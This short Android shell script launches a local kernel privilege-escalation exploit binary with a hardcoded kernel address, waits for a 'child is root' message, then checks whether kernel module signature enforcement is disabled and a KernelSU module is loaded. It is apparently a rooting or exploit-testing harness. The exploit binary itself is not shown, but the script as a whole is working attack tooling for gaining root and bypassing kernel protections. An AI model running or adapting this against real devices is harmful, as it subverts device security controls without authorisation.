#!/system/bin/sh
# Run the exploit, then immediately verify sig_enforce and try the LKM.
LOG=/data/local/tmp/glk-run.log
rm -f "$LOG" /data/local/tmp/insmod_out2.log
echo "uptime_before=$(cut -d' ' -f1 /proc/uptime)"
GLK_ZERO_ADDR=0xffffffc0830c7708 setsid /data/local/tmp/glk-bin3 \
    --load-prebuilt-profile /data/local/tmp/profile_175.bin > "$LOG" 2>&1 &
for i in $(seq 1 45); do
    sleep 2
    grep -qa "child is root" "$LOG" && break
done
echo "waited=$((i*2))s"
sleep 6
echo "sig_enforce=$(cat /sys/module/module/parameters/sig_enforce 2>&1)"
echo "--- ksu dir ---"
ls -d /data/adb/ksu 2>&1
echo "--- insmod_out ---"
cat /data/local/tmp/insmod_out.log 2>&1 | tail -8
echo "--- modules ---"
grep -i ksu /proc/modules 2>&1
echo "--- run log tail ---"
tail -6 "$LOG"
echo "GLK_STEP_DONE"
